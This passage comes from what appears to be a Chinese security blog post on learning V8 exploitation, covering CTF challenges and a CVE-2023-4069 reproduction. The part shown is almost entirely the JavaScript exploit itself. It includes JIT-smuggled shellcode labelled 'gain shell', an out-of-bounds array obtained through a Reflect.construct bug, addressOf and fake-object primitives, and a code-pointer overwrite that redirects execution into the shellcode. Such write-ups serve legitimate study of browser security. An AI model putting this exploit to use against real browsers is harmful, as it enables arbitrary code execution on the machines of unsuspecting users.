= f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">//gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">//p(oob_array);</span><br><span class="line">console.log(oob_array.length);</span><br><span class="line">let oob_element_addr = 0x219 - 1 + 8;</span><br><span class="line"></span><br><span class="line">let element_addr = 0x2c2129 - 1;</span><br><span class="line">let element_addr_start = element_addr + 8;</span><br><span class="line">//let fake_map_addr = element_addr + 0x1000;</span><br><span class="line">let fake_object_addr = element_addr + 0x2000;</span><br><span class="line">let saved_fake_object_addr = element_addr + 0x100;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">printhex(oob_element_addr);</span><br><span class="line">printhex(element_addr);</span><br><span class="line">printhex(element_addr_start);</span><br><span class="line">//printhex(fake_map_addr);</span><br><span class="line">printhex(fake_object_addr);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">let victim_array = new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">//p(victim_array);</span><br><span class="line">let float_arr = [1.1,2.2,3.3];</span><br><span class="line">p(float_arr);</span><br><span class="line">//stop();</span><br><span class="line"></span><br><span class="line">//oob_array[(fake_map_addr - oob_element_addr)/8] = i2f(0x2c04040400000061n);</span><br><span class="line">//oob_array[(fake_map_addr - oob_element_addr)/8 + 1] = i2f(0x0a0007ff11000842n);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8] = i2f64(0x0018ece5,0x0);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(0x1000,0x1000);</span><br><span class="line">oob_array[(saved_fake_object_addr - oob_element_addr)/8] = i2f64(fake_object_addr+1,fake_object_addr+1);</span><br><span class="line"></span><br><span class="line">var fake_object = victim_array[(saved_fake_object_addr - element_addr_start)/4];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">function addressOf(obj)&#123;</span><br><span class="line">    victim_array[0] = obj;</span><br><span class="line">    return i2lo(f2i(oob_array[(element_addr_start - oob_element_addr)/8]));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">p(shellcode);</span><br><span class="line"> </span><br><span class="line">var shellcode_addr = addressOf(shellcode);</span><br><span class="line">printhex(shellcode_addr);</span><br><span class="line"> </span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(shellcode_addr - 8 + 0x18,0x1000);</span><br><span class="line"> </span><br><span class="line">var code_addr = i2lo(f2i(fake_object[0]));</span><br><span class="line">printhex(code_addr);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(code_addr - 8 + 0x10,0x1000);</span><br><span class="line">var ins_base = (f2i(fake_object[0]));</span><br><span class="line"> </span><br><span class="line">var rop_addr = ins_base + 0x82n;</span><br><span class="line">fake_object[0] = i2f(rop_addr);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//stop();</span><br><span class="line">shellcode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210356932.png" alt="image-20251208210356932"></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">h0m3</a></li>
        
          <li><a href="/about/">ab0ut</a></li>
        
          <li><a href="/archives/">art1cl3s</a></li>
        
          <li><a href="/links/">l1nks</a></li>
        
          <li><a href="/search/">s3arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#V8%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">V8基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starCTF2019-OOB"><span class="toc-number">2.</span> <span class="toc-text">starCTF2019-OOB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-CTF-2018-Just-In-Time"><span class="toc-number">3.</span> <span class="toc-text">Google CTF 2018 Just-In-Time</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">具体利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-4069%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">CVE-2023-4069复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E8%B7%AF%E5%BE%84%E7%9A%84%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">快速路径的分配流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#diff%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">diff分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%E7%BC%96%E5%86%99"><span class="toc-number">4.2.3.</span> <span class="toc-text">exp编写</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&text=V8 Pwn的学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&is_video=false&description=V8 Pwn的学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=V8 Pwn的学习&body=Check out this article: http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&name=V8 Pwn的学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&t=V8 Pwn的学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        PuH4ck3rX
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">h0m3</a></li><!--
        --><!--
          --><li><a href="/about/">ab0ut</a></li><!--
        --><!--
          --><li><a href="/archives/">art1cl3s</a></li><!--
        --><!--
          --><li><a href="/links/">l1nks</a></li><!--
        --><!--
          --><li><a href="/search/">s3arch</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- busuanzi统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'SITENAME';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
